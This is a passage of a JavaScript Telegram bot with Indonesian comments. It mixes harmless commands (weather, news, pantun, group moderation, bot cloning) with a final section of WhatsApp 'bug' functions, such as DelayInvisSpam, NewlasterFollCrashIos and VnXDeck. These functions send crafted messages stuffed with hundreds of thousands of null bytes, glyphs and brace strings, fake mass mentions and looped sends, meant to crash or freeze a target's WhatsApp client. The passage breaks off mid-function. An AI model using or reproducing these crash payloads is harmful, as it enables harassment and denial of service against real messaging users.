    if (!target) return ctx.reply("Reply orang yang mau di cek IQ.");

    const iq = Math.floor(Math.random() * 200);
    ctx.reply(`🧠 IQ dia adalah: ${iq}`);
});         
bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});
////========CASE MULTIDEVICE========\\\
bot.command("pinterest", async ctx => {
  const q = ctx.message.text.replace("/pinterest ", "")
  if (!q) return ctx.reply("Format: /pinterest kucing")

  const res = await axios.get(
    "https://id.pinterest.com/search/pins/?q=" + encodeURIComponent(q),
    { headers: { "User-Agent": "Mozilla/5.0" } }
  )

  const img = res.data.match(/https:\/\/i\.pinimg\.com\/originals\/[^"]+/)

  ctx.replyWithPhoto(img[0], { caption: q })
})

bot.command("ig", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply(
      "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/"
    );

  const url = text.trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(
      url
    )}`;

    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data?.result) {
      return ctx.reply("❌ Failed to fetch Instagram media. Please check the URL.");
    }

    const username = data.result.username || "-";

    if (data.result.video) {
      await ctx.replyWithVideo(data.result.video, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else if (data.result.image) {
      await ctx.replyWithPhoto(data.result.image, {
        caption: `📸 Instagram Media\n\n👤 Author: ${username}`,
      });
    } else {
      ctx.reply("❌ Unsupported media type from Instagram.");
    }
  } catch (err) {
    console.error("Instagram API Error:", err);
    ctx.reply("❌ Error fetching Instagram media. Please try again later.");
  }
});
bot.command("info", (ctx) => {
  const u = ctx.from;

  const info = `
🪪 <b>Your Profile Info</b>
━━━━━━━━━━━━━━━━━━
👤 Name: ${u.first_name || "-"} ${u.last_name || ""}
🏷 Username: @${u.username || "None"}
🆔 ID: <code>${u.id}</code>
🌐 Language: ${u.language_code || "unknown"}
`;

  ctx.reply(info, { parse_mode: "HTML" });
});

bot.command("gempa", async (ctx) => {
  try {
    const res = await fetch(
      "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json"
    );
    const data = await res.json();
    const g = data.Infogempa.gempa;

    const info = `
📢 *Latest Earthquake (BMKG)*
📅 Date: ${g.Tanggal}
🕒 Time: ${g.Jam}
📍 Location: ${g.Wilayah}
📊 Magnitude: ${g.Magnitude}
📌 Depth: ${g.Kedalaman}
🌊 Potential: ${g.Potensi}
🧭 Coordinates: ${g.Coordinates}
🗺️ Felt: ${g.Dirasakan || "-"}
`;

    await ctx.reply(info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch earthquake data.");
  }
});
bot.command("dunia", async (ctx) => {
  await ctx.reply("🌍 Fetching world news...");

  try {
    const res = await fetch("https://feeds.bbci.co.uk/news/world/rss.xml");
    const xml = await res.text();

    const items = [...xml.matchAll(
      /<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs
    )]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");

    if (!items) throw new Error("No data");

    const message =
      `🌎 *Latest World News*\n\n${items}\n\n📰 _Source: BBC News_`;

    await ctx.reply(message, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to fetch world news.");
  }
});
bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});
bot.command("tagadmin", async (ctx) => {
  const admins = await ctx.getChatAdministrators();
  const names = admins
    .slice(0, 30)
    .map(a => `@${a.user.username || a.user.first_name}`)
    .join(" ");

  ctx.reply(`📢 ${names}`);
});
bot.command("groupinfo", async (ctx) => {
  if (!ctx.chat.title) {
    return ctx.reply("❌ This command is for groups only.");
  }

  const admins = await ctx.getChatAdministrators();

  ctx.reply(
`👥 *Group Info*
📛 Name: ${ctx.chat.title}
🆔 ID: ${ctx.chat.id}
👑 Admins: ${admins.length}
`,
    { parse_mode: "Markdown" }
  );
});
bot.command("logo", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply("🖋️ Example:\n/logo Your Text");
  }

  try {
    const logoUrl =
      `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await ctx.reply(
      `🖋️ Your logo is ready!\nText: *${text}*`,
      { parse_mode: "Markdown" }
    );

    await ctx.replyWithPhoto(logoUrl, {
      caption: "✨ Logo by FlamingText",
    });

  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Failed to generate logo. Please try again later.");
  }
});
bot.command("pantun", (ctx) => {
  const kategori = (ctx.message.text.split(" ")[1] || "acak").toLowerCase();

  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];
  const daftar = pantun[kategori] || allPantun;
  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  ctx.reply(
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});
const duel = {};

// Tantang duel
bot.command("duel", (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target || !target.startsWith("@")) {
    return ctx.reply("⚠️ Gunakan: /duel @username");
  }

  duel[ctx.chat.id] = target;
  const challenger = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  ctx.reply(`${challenger} menantang ${target}! Gunakan /terima untuk mulai.`);
});

// Terima duel
bot.command("terima", (ctx) => {
  if (!duel[ctx.chat.id]) return;

  const player1 = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const players = [player1, duel[ctx.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];

  ctx.reply(`⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[ctx.chat.id];
});
bot.command("cuaca", async (ctx) => {
  const kota = ctx.message.text.split(" ").slice(1).join(" ");
  if (!kota) return ctx.reply("⚠️ Gunakan: /cuaca <kota>");

  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    ctx.reply(`🌤 Cuaca ${data}`);
  } catch {
    ctx.reply("⚠️ Tidak bisa mengambil data cuaca");
  }
});
bot.command("speed", async (ctx) => {
  const start = Date.now();
  await ctx.reply("⏱ Measuring...");
  const end = Date.now();
  ctx.reply(`⚡ Bot response: ${end - start} ms`);
});

// Command /setrules <teks aturan>
bot.command("setrules", (ctx) => {
  const chatId = ctx.chat.id;
  const rulesText = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!rulesText) {
    return ctx.reply("⚠️ Gunakan:\n/setrules <aturan grup>");
  }

  groupRules[chatId] = rulesText;
  ctx.reply("✅ Group rules have been saved.");
});
bot.command('deploy', checkOwner, async (ctx) => {
    const tokenBaru = ctx.message.text.split(' ')[1];

    if (!tokenBaru) return ctx.reply('⚠️ Mana tokennya, Bosku? \nFormat: /deploy [token]');
    if (daftarBotAnak[tokenBaru]) return ctx.reply('❌ Bot ini sudah jalan, jangan di-deploy dua kali!');

    try {
        // Cek dulu tokennya hidup gak
        const cek = await axios.get(`https://api.telegram.org/bot${tokenBaru}/getMe`);
        const infoBot = cek.data.result;

        // --- PROSES CLONING ---
        const botAnak = new Telegraf(tokenBaru);

        // Copy semua fitur bot UTAMA ke bot ANAK
        botAnak.use(bot.middleware()); 

        // Jalankan bot anak
        botAnak.launch();
        daftarBotAnak[tokenBaru] = infoBot.username;

        const teks = `🚀 <b>BOT BERHASIL DI-DEPLOY!</b> 🚀
━━━━━━━━━━━━━━━━━━━━━━
🤖 <b>Nama:</b> <code>${infoBot.first_name}</code>
🏷️ <b>Username:</b> @${infoBot.username}
🆔 <b>ID:</b> <code>${infoBot.id}</code>
━━━━━━━━━━━━━━━━━━━━━━
✨ <i>Sekarang @${infoBot.username} sudah punya fitur yang sama dengan bot ini!</i>`;

        ctx.reply(teks, { parse_mode: 'HTML' });

    } catch (e) {
        ctx.reply(`❌ <b>GAGAL DEPLOY!</b>\nLog: <code>${e.message}</code>`);
    }
});

// 2. TOOL UNTUK CEK BOT APA SAJA YANG LAGI JALAN
bot.command('listdeploy', checkOwner, async (ctx) => {
    const list = Object.values(daftarBotAnak);
    if (list.length === 0) return ctx.reply('Belum ada bot yang di-deploy.');

    let teks = `📑 <b>DAFTAR BOT AKTIF (${list.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    list.forEach((uname, i) => {
        teks += `${i + 1}. @${uname}\n`;
    });
    ctx.reply(teks, { parse_mode: 'HTML' });
});
// 1. FITUR: HAPUS/MATIKAN SATU BOT DEPLOY
bot.command('deldeploy', checkOwner, async (ctx) => {
    const tokenTarget = ctx.message.text.split(' ')[1];

    if (!tokenTarget) {
        return ctx.reply('⚠️ Mana token yang mau dihapus?\nFormat: /deldeploy [token]');
    }

    if (daftarBotAnak[tokenTarget]) {
        const usernameBot = daftarBotAnak[tokenTarget];
        
        // Menghapus data dari list aktif
        delete daftarBotAnak[tokenTarget];
        
        // Catatan: Di Telegraf, untuk benar-benar menghentikan polling bot anak 
        // yang sedang jalan secara runtime tanpa restart total agak teknis, 
        // tapi dengan menghapus dari daftar ini, bot tersebut tidak akan 
        // merespon perintah baru lagi (tergantung struktur deploy-mu).
        
        ctx.reply(`✅ <b>BERHASIL DIHAPUS!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBot @${usernameBot} telah dihapus dari daftar deploy.`, { parse_mode: 'HTML' });
    } else {
        ctx.reply('❌ Token tersebut tidak ada dalam daftar bot yang sedang jalan.');
    }
});

// 2. FITUR: MATIKAN SEMUA BOT ANAK (CLEAN UP)
bot.command('stopall', checkOwner, async (ctx) => {
    const jumlah = Object.keys(daftarBotAnak).length;
    
    if (jumlah === 0) {
        return ctx.reply('Operasi gagal, tidak ada bot anak yang sedang jalan.');
    }

    // Mengosongkan objek daftar bot
    daftarBotAnak = {};
    
    ctx.reply(`♻️ <b>CLEAN UP BERHASIL!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBerhasil menghentikan <b>${jumlah} Bot Anak</b>.\nRAM Panel sekarang lebih lega!`, { parse_mode: 'HTML' });
});
// Command /rules
bot.command("rules", (ctx) => {
  const chatId = ctx.chat.id;
  const rules = groupRules[chatId] || "No rules have been set yet.";

  ctx.reply(
    `📜 *Group Rules:*\n${rules}`,
    { parse_mode: "Markdown" }
  );
});
let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

bot.command("maps", (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");

  if (!query) {
    return ctx.reply("🗺 Example:\n/maps Jakarta");
  }

  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(query)}`;

  ctx.reply(`🗺 Location found:\n${link}`);
});
// ===== MUTE GB =====
bot.command("lock", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    await ctx.setChatPermissions({
        can_send_messages: false
    });
    ctx.reply("🔒 Group dikunci.");
});

bot.command("unlock", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    await ctx.setChatPermissions({
        can_send_messages: true
    });
    ctx.reply("🔓 Group dibuka.");
});
// ===== PIN CHAT=====
bot.command("del", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan bot.");

    try {
        await ctx.deleteMessage(ctx.message.reply_to_message.message_id);
    } catch {
        ctx.reply("Gagal hapus pesan.");
    }
});
// ===== PIN CHAT=====
bot.command("pin", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan yang mau di-pin.");

    await ctx.pinChatMessage(ctx.message.reply_to_message.message_id);
    ctx.reply("Pesan berhasil di pin.");
});
// ===== MUTE/UNMUTE =====
bot.command('mute', async (ctx) => {
  if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
  if (!ctx.message.reply_to_message) 
    return ctx.reply("⚠️ Reply pesan target!");

  const userId = ctx.message.reply_to_message.from.id;

  await ctx.restrictChatMember(userId, {
    permissions: {
      can_send_messages: false
    }
  });

  ctx.reply("🔇 Mampus di mute 😂");
});

bot.command('unmute', async (ctx) => {
  if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
  if (!ctx.message.reply_to_message) 
    return ctx.reply("⚠️ Reply pesan target!");

  const userId = ctx.message.reply_to_message.from.id;

  await ctx.restrictChatMember(userId, {
    permissions: {
      can_send_messages: true
    }
  });

  ctx.reply("Okelah dia boleh chat lagi");
});
// ===== KICK =====
bot.command("kick", async (ctx) => {

    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan member yang mau dikick.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.kickChatMember(userId);
        ctx.reply("✅ Member berhasil dikick.");
    } catch {
        ctx.reply("❌ Gagal kick member.");
    }
});

// ===== PROMOTE =====
bot.command("promote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan member.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.promoteChatMember(userId, {
            can_change_info: true,
            can_delete_messages: true,
            can_invite_users: true,
            can_restrict_members: true,
            can_pin_messages: true,
            can_promote_members: false,
        });

        ctx.reply("✅ Berhasil promote.");
    } catch {
        ctx.reply("❌ Gagal promote.");
    }
});

// ===== DEMOTE =====
bot.command("demote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Admin only");
    if (!ctx.message.reply_to_message)
        return ctx.reply("Reply pesan admin.");

    const userId = ctx.message.reply_to_message.from.id;

    try {
        await ctx.promoteChatMember(userId, {
            can_change_info: false,
            can_delete_messages: false,
            can_invite_users: false,
            can_restrict_members: false,
            can_pin_messages: false,
            can_promote_members: false,
        });

        ctx.reply("✅ Admin diturunkan.");
    } catch {
        ctx.reply("❌ Gagal demote.");
    }
});
bot.command("fileinfo", (ctx) => {
  ctx.reply("📂 Send the file you want to check!");
});
async function handleFile(ctx, type) {
  const chatId = ctx.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = ctx.message.document.file_id;
    fileName = ctx.message.document.file_name;
  } else if (type === "photo") {
    const photo = ctx.message.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = ctx.message.video.file_id;
    fileName = ctx.message.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = ctx.message.audio.file_id;
    fileName = ctx.message.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *File Information*
━━━━━━━━━━━━━━━━
📄 Name: ${fileName}
📏 Size: ${fileSize}
🧩 Extension: ${fileExt || "-"}
🔗 URL: [Click here](${fileUrl})
`;

    ctx.reply(info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Fileinfo error:", err);
    ctx.reply("⚠️ Failed to get file info. Please resend the file.");
  }
}

bot.on("document", (ctx) => handleFile(ctx, "document"));
bot.on("photo", (ctx) => handleFile(ctx, "photo"));
bot.on("video", (ctx) => handleFile(ctx, "video"));
bot.on("audio", (ctx) => handleFile(ctx, "audio"));

function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}
bot.command("antilink", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const status = (args[0] || "").toLowerCase();

  if (!["on", "off"].includes(status)) {
    return ctx.reply("⚠️ Gunakan:\n/antilink on\n/antilink off");
  }

  if (status === "on") {
    antiLink = true;
    return ctx.reply("✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    return ctx.reply("⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("text", async (ctx) => {
  if (!antiLink) return;

  const text = ctx.message.text;
  if (linkPattern.test(text)) {
    try {
      await ctx.deleteMessage();
      await ctx.reply("🚫 Pesan berisi link telah dihapus otomatis!");
    } catch (e) {
      // ignore error (mis. bot bukan admin)
    }
  }
});
// ===== SIMPAN MEMBER YANG CHAT =====
bot.on("message", (ctx) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
        const chatId = ctx.chat.id;
        if (!groupMembers[chatId]) groupMembers[chatId] = new Map();

        groupMembers[chatId].set(ctx.from.id, ctx.from);
    }
});

///////////////////[FUNC]////////////////
async function DelayInvisSpam(sock, target) {
  const vnxmsgya = {
      groupStatusMessageV2: {
        message: {
         interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
               { length: 1900 },
               () =>
                 "1" +
                 Math.floor(Math.random() * 500000) +
                 "@s.whatsapp.net"
             ),
          body: {
            text: "VnX The Winnerr",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(2248100),
            version: 3
            }
           }
          }
        }
        }
      };
        
  await sock.relayMessage(target, vnxmsgya, {
    messageId: null,
    participant: { jid: target },
  })
 };
    
async function BlankNotiffButton(sock, target) {
  const buttonnotif = [
    {
      buttonId: "No Make Up Tetep Cantik",
      buttonText: {
        displayText: "𑜦𑜠" + "ꦾ".repeat(40000)
      },
      type: 1
    },
    {
      buttonId: "Paling Asik",
      buttonText: {
        displayText: "𑜦𑜠" + "ꦽ".repeat(30000)
      },
      type: 1
    },
    {
      buttonId: "Paling Classy",
      buttonText: {
        displayText: "ꦾ".repeat(20000)
      },
      type: 1
    },
    {
      buttonId: "Sama Sama Suka",
      buttonText: {
        displayText: "ꦾ".repeat(22000)
      },
      type: 1
    },
    {
      buttonId: "VnX",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

 const mbgbutton = {
   buttonsMessage: {
        contentText: "ꦾ".repeat(80000),
        footerText: "ꦽ".repeat(6000),
        buttons: buttonnotif,
      headerType: 1
    }
  };
  
  await sock.relayMessage(target, mbgbutton, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
}  
    
async function BlankOneMsg(sock, target) { 
 for (let i = 0; i < 2; i++) {
 await sock.relayMessage(target, {
   newsletterAdminInviteMessage: {
     newsletterJid: "123456789@newsletter",
     newsletterName: "VnX" + "ꦽ".repeat(99000),
     inviteCode: "INVITE_" + "X".repeat(5000),
     inviteExpiration: Date.now() + 9999999999,
     caption: "VnXNew" + "ꦾ".repeat(220000) + "\u0000".repeat(99000),
  }
 }, {
  participant: { jid: target }
  });
 }
}
    
async function DelayHardSwVnX(sock, target, mention = true) {
const vnxyo = generateWAMessageFromContent(
 target,
{     
viewOnceMessage: {
message: { 
interactiveResponseMessage: {
body: {
text: "VnX & Threesixty Nih"
},
nativeFlowResponseMessage: {
name: "call_permission_request",          
paramsJson: "\x10", 
version: 3,
}, 
entryPointConversionSource: "call_permission_request"    
}
}
}
},
{ userJid: target }
);
await sock.relayMessage("status@broadcast", vnxyo.message, {
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
],
statusJidList: [target],
messageId: vnxyo.key.id
})
if (mention) {
await sock.relayMessage(
target,
{
statusMentionMessage: {
message: { protocolMessage: { key: vnxyo. key, type: 25 } }
}
},
{}
)
}
await sleep(1500)
}

 async function NewlasterFollCrashIos(sock, target) {
    const RamadhanIos = {
      botInvokeMessage: {
        message: {
          newsletterFollowerInviteMessage: {
            newsletterJid: "123456789@newsletter",
            newsletterName: "X" + "ꦽ".repeat(10000),
            inviteCode: "INVITE_" + "X".repeat(5000),
            inviteExpiration: Date.now() + 9999999999,
           caption: "VnX" + "\u0000".repeat(9900),
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "{{".repeat(99000),
      },
    };

    await sock.relayMessage(
    target,
    RamadhanIos,
    { messageId: null }
  );
} 
    
async function VnXBulldo(sock, target) {
  for (let i = 0; i < 100; i++) {
  var BulldoVnX = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "VnX Bulldo?",
     },
      groupMentions: [],
       entryPointConversionSource: "non_contact",
       entryPointConversionApp: "whatsapp",
       entryPointConversionDelaySeconds: 467593,
        fromMe: false,
        isForwarded: true,
       forwardingScore: 999,
        businessMessageForwardInfo: {
       businessOwnerJid: target,
     },
      nativeFlowMessage: {
        name: "galaxy_message",
        ParamsJson: "\u0000".repeat(10000),
        version: 3,
       },
     }, {});
    
  await sock.relayMessage(
    target,
     {
          message: BulldoVnX.message
         },
      {}
    );
  } 
} 
    
async function DelayIos(sock, target) {
  const IosNjr = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(80000); 
  await sock.relayMessage('status@broadcast', msg.message, {
    extendedTextMessage: {
      text: "Do you have an iPhone?" + IosNjr,
      matchedText: "Are You Ready?༑ ϟ",
      nativeFlowMessage: {
      name: "galaxy_message",
      ParamsJson: "\u0000".repeat(99000),
      version: 3,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        pairedMediaType: "NOT_PAIRED_MEDIA",
        forwardOrigin: "UNKNOWN"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }
  }, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: 'meta',
      attrs: {},
      content: [{
        tag: 'mentioned_users',
        attrs: {},
        content: [{
          tag: 'to',
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function OneTapLoca(sock, target) {
const vnxmsg = generateWAMessageFromContent(
target,
{
      viewOnceMessage: {
        message: {
          locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -11.11,
              name: "VNX IS HERE" + "ꦽ".repeat(60000),
              url: "https://t.me/Raffioffci2"
           }
          }
        }
       },
      { userJid: target }
     );
  
await sock.relayMessage(
    target,
      vnxmsg.message,
    {
      participant: { jid: target },
      messageId: vnxmsg.key.id
    }
  );
} 
    
async function VnXDeck(sock, target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(2200000),
    locationMessage: {
        degreesLatitude: -12999,
        degreesLongitude: 34999,
        mame: "VnX⌜𖣂⌟༑⃟",
        address: "VnX⌜𖣂⌟༑⃟꙳",
       forwardingScore: 9741,
         isForwarded: true,
       forwardedNewsletterMessageInfo: {
        newsletterJid: "9741@newsletter",
        serverMessageId: 1,
        newsletterName: "-"
       },
     },
    inviteLinkGroupTypeV2: "https://wa.me/settings/linked_devices/,,VnXRaffi",
  },
},
{
 paymentLinkMetadata: {
   button: { displayText: "\u0000" + "{".repeat(12000) },
   header: { headerType: 1 },
   provider: { paramsJson: "{{".repeat(220000) },
   sourceUrl: "https://wa.me/meta",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
    
async function DelayStikerNullNew(sock, target) {
  const vnxyo = generateWAMessageFromContent(
    target,
    {
     lottieStickerMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/556034768_1550187782925551_593550255230028148_n.enc?ccb=11-4&oh=01_Q5Aa3gFiktTWHeylkGpb1mTAptIHKLI1wqM2UqEA1VgXTfd5tQ&oe=698A1911&_nc_sid=5e03e0&mms3=true",
          fileSha256: "bTGmHaE/1M0lLSMttq01s4squE0JG6AchiiJZbY7AXo=",
          fileEncSha256: "0W5oU3FtQ8CsKPM/tvGlglaMEOIuXPmGzw3QcZUy8TI=",
          mediaKey: "N7PSHdjXLE4z5HoBwAokc16ryqdpCHa21i4MVWOv8Io=",
          mimetype: "application/was",
          height: 512,
          width: 512,
          directPath: "/v/t62.15575-24/556034768_1550187782925551_593550255230028148_n.enc",
          fileLength: "10531",
          mediaKeyTimestamp: "1768075590",
          isAnimated: true,
          stickerSentTs: "1768075590203",
          isAvatar: false,
          isAiSticker: false,
          isLottie: true,
          contextInfo: {
            mentionedJid: [target],
            stanzaId: "12345678POUMODSOFFC",
            quotedMessage: {
            interactiveResponseMessage: {
             body: {
            text: "VnX Is Here"
            },
            businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@bot"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request", 
            paramsJson: "\u0000".repeat(1000000),
            version: 3,
            sourceUrl: `t.me/Raffioffci2`
              }
            }
          }
        }
       }
      }
     }
    },
   { userJid: target }
  );

  await sock.relayMessage(
    target,
      vnxyo.message,
    {
      participant: { jid: target },
      messageId: vnxyo.key.id
    }
  );
}

async function epcihDiley(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "$",
                            matchedText: "https://t.me/SennMieAyam",
                            description: "$",
                            title: "$",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@jule",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,jule",
                                videoContentCaption: "@jule",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
